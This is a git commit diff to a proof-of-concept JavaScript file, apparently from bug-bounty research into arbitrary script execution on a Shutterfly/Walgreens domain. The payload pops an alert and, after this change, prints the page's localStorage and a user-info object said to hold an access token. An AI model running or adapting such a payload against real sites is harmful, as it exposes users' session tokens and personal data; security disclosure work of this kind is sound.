92d1e540147b6d197eb8b8ee8b80c425b25b437a
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2024-01-11 16:21:13 +0100

    Update walgreen1.js

--- poc/shutterfly/walgreen1.js
+++ poc/shutterfly/walgreen1.js
@@ -3,4 +3,5 @@ console.log(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 console.log(">>>>>> Kharaone, PoC for arbitrary JS execution on " + document.domain);
 console.log(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
 alert(document.domain);
-console.log((localStorage));
+console.log("Local Storage:\n" + (localStorage));
+console.log("Sensitive User Data (see gs_access_token):\n" + create_dynamic_user_info);
